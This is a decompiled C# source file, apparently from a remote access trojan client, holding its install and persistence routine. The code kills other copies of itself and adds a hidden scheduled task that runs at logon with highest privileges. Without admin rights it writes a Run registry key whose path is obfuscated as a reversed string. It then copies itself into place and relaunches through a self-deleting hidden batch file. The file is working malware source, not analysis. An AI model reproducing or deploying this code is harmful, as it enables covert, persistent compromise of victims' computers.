﻿using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Client.Helper;
using Microsoft.VisualBasic;
using Microsoft.Win32;

namespace Client.Install
{
	// Token: 0x02000005 RID: 5
	internal class NormalStartup
	{
		// Token: 0x06000024 RID: 36 RVA: 0x00002C2C File Offset: 0x00000E2C
		public static void Install()
		{
			try
			{
				FileInfo fileInfo = new FileInfo(Path.Combine(Environment.ExpandEnvironmentVariables(Settings.InstallFolder), Settings.InstallFile));
				string fileName = Process.GetCurrentProcess().MainModule.FileName;
				if (fileName != fileInfo.FullName)
				{
					foreach (Process process in Process.GetProcesses())
					{
						try
						{
							if (process.MainModule.FileName == fileInfo.FullName)
							{
								process.Kill();
							}
						}
						catch
						{
						}
					}
					if (Methods.IsAdmin())
					{
						Process.Start(new ProcessStartInfo
						{
							FileName = "cmd",
							Arguments = string.Concat(new string[]
							{
								"/c schtasks /create /f /sc onlogon /rl highest /tn \"",
								Path.GetFileNameWithoutExtension(fileInfo.Name),
								"\" /tr '\"",
								fileInfo.FullName,
								"\"' & exit"
							}),
							WindowStyle = ProcessWindowStyle.Hidden,
							CreateNoWindow = true
						});
					}
					else
					{
						using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Strings.StrReverse("\\nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS"), RegistryKeyPermissionCheck.ReadWriteSubTree))
						{
							registryKey.SetValue(Path.GetFileNameWithoutExtension(fileInfo.Name), "\"" + fileInfo.FullName + "\"");
						}
					}
					if (File.Exists(fileInfo.FullName))
					{
						File.Delete(fileInfo.FullName);
						Thread.Sleep(1000);
					}
					Stream stream = new FileStream(fileInfo.FullName, FileMode.CreateNew);
					byte[] array = File.ReadAllBytes(fileName);
					stream.Write(array, 0, array.Length);
					Methods.ClientOnExit();
					string text = Path.GetTempFileName() + ".bat";
					using (StreamWriter streamWriter = new StreamWriter(text))
					{
						streamWriter.WriteLine("@echo off");
						streamWriter.WriteLine("timeout 3 > NUL");
						streamWriter.WriteLine("START \"\" \"" + fileInfo.FullName + "\"");
						streamWriter.WriteLine("CD " + Path.GetTempPath());
						streamWriter.WriteLine("DEL \"" + Path.GetFileName(text) + "\" /f /q");
					}
					Process.Start(new ProcessStartInfo
					{
						FileName = text,
						CreateNoWindow = true,
						ErrorDialog = false,
						UseShellExecute = false,
						WindowStyle = ProcessWindowStyle.Hidden
					});
					Environment.Exit(0);
				}
			}
			catch (Exception)
			{
			}
		}
	}
}
